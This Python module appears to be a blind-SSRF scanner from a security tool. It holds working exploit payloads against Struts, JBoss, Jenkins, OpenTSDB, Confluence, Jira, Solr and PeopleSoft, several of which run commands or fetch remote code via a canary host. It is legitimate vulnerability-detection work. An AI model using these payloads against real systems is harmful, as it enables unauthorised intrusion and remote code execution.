# https://github.com/assetnote/blind-ssrf-chains
from bbot.core.errors import InteractshError
from bbot.modules.generic_ssrf import generic_ssrf, BaseSubmodule


class ApacheStruts(BaseSubmodule):

    technique_description = "Apache Struts (S2-016)"
    severity = "CRITICAL"
    paths = [
        '?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{\'command\'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}'
    ]


class JBoss(BaseSubmodule):

    technique_description = "JBOSS Deploy WAR from URL"
    severity = "CRITICAL"
    paths = [
        "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war"
    ]


class ConfluenceSharelinks(BaseSubmodule):

    technique_description = "Confluence Sharelinks"
    severity = "HIGH"
    paths = ["/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/"]


class ConfluenceIconUriServlet(BaseSubmodule):

    technique_description = "Confluence < 6.1.3 (CVE-2017-9506)"
    severity = "HIGH"
    paths = ["/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY"]


class JiraIconUriServlet(BaseSubmodule):

    technique_description = "Jira < 7.3.5 (CVE-2017-9506)"
    severity = "HIGH"
    paths = ["/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY"]


class JiraMakeRequest(BaseSubmodule):

    technique_description = "Jira < 8.4.0 (CVE-2019-8451)"
    severity = "HIGH"
    paths = ["/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com"]


class AtlassianIconUriServlet(BaseSubmodule):

    technique_description = "Atlassian iconUriServlet (CVE-2017-9506)"
    severity = "HIGH"
    paths = ["/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY"]


class OpenTSDB(BaseSubmodule):

    technique_description = "OpenTSDB Remote Code Execution"
    severity = "CRITICAL"
    paths = [
        "/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png"
    ]


class JenkinsCVE_2018_1000600(BaseSubmodule):

    technique_description = "Jenkins CVE-2018-1000600"
    severity = "MEDIUM"
    paths = [
        "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=user&password=pass"
    ]


class JenkinsRCE(BaseSubmodule):

    technique_description = "Jenkins Unauthenticated RCE"
    severity = "CRITICAL"
    paths = [
        "/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='example.com', root='http://SSRF_CANARY/')%0a@Grab(group='com.example', module='poc', version='1')%0aimport example;"
    ]


class JenkinsRCEViaGroovy(BaseSubmodule):

    technique_description = "Jenkins RCE Groovy"
    severity = "CRITICAL"

    def create_paths(self):
        return [
            '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {public x(){"curl http://SSRF_CANARY".execute()}}"'
        ]


class Hystrix(BaseSubmodule):

    technique_description = "Spring Cloud Netflix CVE-2020-5412"
    severity = "MEDIUM"
    paths = ["/proxy.stream?origin=http://SSRF_CANARY/"]


class W3TotalCache(BaseSubmodule):

    technique_description = "W3 Total Cache Arbitrary File Read (CVE-2019-6715)"
    severity = "HIGH"
    paths = ["/wp-content/plugins/w3-total-cache/pub/sns.php"]

    def test(self, event):

        subdomain_tag = self.parent_module.helpers.rand_string(4)
        for test_path in self.test_paths:
            put_data = {
                "Type": "SubscriptionConfirmation",
                "Message": "",
                "SubscribeURL": "https://SSRF_CANARY".replace(
                    "SSRF_CANARY", f"{subdomain_tag}.{self.parent_module.interactsh_domain}"
                ),
            }
            test_url = f"{event.parsed.scheme}://{event.parsed.netloc}{test_path}"
            r = self.parent_module.helpers.curl(url=test_url, method="PUT", post_data=put_data)
            if r:
                self.process(event, r, subdomain_tag)


class WeblogicUDDIExplorer(BaseSubmodule):

    technique_description = "UDDI Explorer (CVE-2014-4210)"
    severity = "MEDIUM"
    paths = [
        "/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    ]


class ApacheSolrShards(BaseSubmodule):

    technique_description = "Apache SOLR Shards Param"
    severity = "MEDIUM"
    paths = [
        '/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}',
        "/solr/db/select?q=var&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json",
        "/xxx?q=aaa%26shards=http://SSRF_CANARY/solr",
        "/xxx?q=aaa&shards=http://SSRF_CANARY/solr",
    ]


class ApacheSolrXXE(BaseSubmodule):

    technique_description = "Apache Solr XXE (2017)"
    severity = "MEDIUM"
    paths = [
        "/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://SSRF_CANARY/xxx\"'><a></a>",
        "/xxx?q={!type=xmlparser v=\"<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>\"}",
    ]


class PeopleSoftXXE_1(BaseSubmodule):

    technique_description = "PeopleSoft XXE 1"
    severity = "HIGH"
    paths = ["/PSIGW/HttpListeningConnector"]

    def test(self, event):

        subdomain_tag = self.parent_module.helpers.rand_string(4)

        post_body = """
        <?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
   <ExternalOperationName>&x;</ExternalOperationName>
   <OperationType/>
   <From><RequestingNode/>
      <Password/>
      <OrigUser/>
      <OrigNode/>
      <OrigProcess/>
      <OrigTimeStamp/>
   </From>
   <To>
      <FinalDestination/>
      <DestinationNode/>
      <SubChannel/>
   </To>
   <ContentSections>
      <ContentSection>
         <NonRepudiation/>
         <MessageVersion/>
         <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
         </Data>
      </ContentSection>
   </ContentSections>
</IBRequest>
""".replace(
            "SSRF_CANARY", f"{subdomain_tag}.{self.parent_module.interactsh_domain}"
        )
        for test_path in self.test_paths:
            test_url = f"{event.parsed.scheme}://{event.parsed.netloc}{test_path}"
            r = self.parent_module.helpers.curl(
                url=test_url, method="POST", raw_data=post_body, headers={"Content-type": "application/xml"}
            )
            if r:
                self.process(event, r, subdomain_tag)


class PeopleSoftXXE_2(BaseSubmodule):

    technique_description = "PeopleSoft XXE 2"
    severity = "HIGH"
    paths = ["/PSIGW/PeopleSoftServiceListeningConnector"]

    def test(self, event):
        subdomain_tag = self.parent_module.helpers.rand_string(4)

        for test_path in self.test_paths:
            post_body = """<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">""".replace(
                "SSRF_CANARY", f"{subdomain_tag}.{self.parent_module.interactsh_domain}"
            )
            test_url = f"{event.parsed.scheme}://{event.parsed.netloc}{test_path}"
            r = self.parent_module.helpers.curl(
                url=test_url, method="POST", raw_body=post_body, headers={"Content-type": "application/xml"}
            )
            if r:
                self.process(event, r, subdomain_tag)


class blind_ssrf(generic_ssrf):

    watched_events = ["URL"]
    produced_events = ["VULNERABILITY"]
    flags = ["active", "aggressive", "web"]
    meta = {"description": "Check for common blind SSRFs"}
    deps_apt = ["curl"]

    in_scope_only = True

    def setup(self):

        self.scanned_hosts = set()
        self.interactsh_subdomain_tags = {}
        self.severity = None
        self.generic_only = self.config.get("generic_only", False)

        if self.scan.config.get("interactsh_disable", False) == False:
            try:
                self.interactsh_instance = self.helpers.interactsh()
                self.interactsh_domain = self.interactsh_instance.register(callback=self.interactsh_callback)
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")
                return False
        else:
            self.warning(
                "The blind_ssrf module is completely dependent on interactsh to function, but it is disabled globally. Aborting."
            )
            return None

        # instantiate submodules
        self.submodules = {}
        for m in BaseSubmodule.__subclasses__():
            if not m.__name__.startswith("Generic_"):
                self.verbose(f"Starting blind_ssrf submodule: {m.__name__}")
                self.submodules[m.__name__] = m(self)
        return True

    def handle_event(self, event):

        host = f"{event.parsed.scheme}://{event.parsed.netloc}/"
        host_hash = hash(host)
        if host_hash in self.scanned_hosts:
            self.debug(f"Host {host} was already scanned, exiting")
            return
        else:
            self.scanned_hosts.add(host_hash)

        self.test_submodules(self.submodules, event)
